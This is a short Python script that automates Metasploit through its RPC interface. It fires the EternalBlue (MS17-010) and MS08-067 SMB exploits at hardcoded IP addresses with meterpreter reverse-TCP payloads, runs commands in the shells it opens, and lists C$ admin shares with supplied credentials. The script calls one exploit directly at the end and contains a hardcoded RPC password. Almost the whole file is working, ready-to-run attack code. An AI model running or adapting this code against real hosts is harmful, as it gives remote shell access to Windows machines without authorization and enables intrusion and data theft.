import subprocess
import smbclient
from pymetasploit3.msfrpc import MsfRpcClient

def smb_account_poc(username,password,domain,ipaddress):
    try:
        smb = smbclient.SambaClient(server=ipaddress, share="C$", username=username, password=password, domain=domain)
        exploit_folder = smb.listdir('/')
        return exploit_folder
    except:
        exploit_folder = "NULL"
        return exploit_folder
def ms17010_poc():
    client = MsfRpcClient('1qaz@WSX', ssl=False)
    exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
    exploit['RHOSTS']  = "10.10.247.206"
    exploit.execute(payload='windows/x64/meterpreter/reverse_tcp')
    session_number = list(client.sessions.list.keys())[0]
    print(session_number)
    if bool(client.sessions.list):
        shell = client.sessions.session(session_number)
        shell.write('dir')
        result = shell.read()
        print(result)
        result.split(' ')
        return result[:240:]
    else:
        print("null")
        return "NULL"
def ms08067_poc():
    client = MsfRpcClient('1qaz@WSX', ssl=False)
    exploit = client.modules.use('exploit','windows/smb/ms08_067_netapi')
    exploit['RHOSTS']  = "192.168.1.5"
    exploit.execute(payload='windows/meterpreter/reverse_tcp')
    print("here")
    session_number = list(client.sessions.list.keys())[0]
    print(session_number)
    if bool(client.sessions.list):
        shell = client.sessions.session(session_number)
        shell.write('netstat')
        result = shell.read()
        print(result)
        result.split(' ')
        print(result)
        return result[:240:]
    else:
        print("null")
        return "NULL"
# ms17010_exploit_data = ms17010_poc()
ms08067_poc()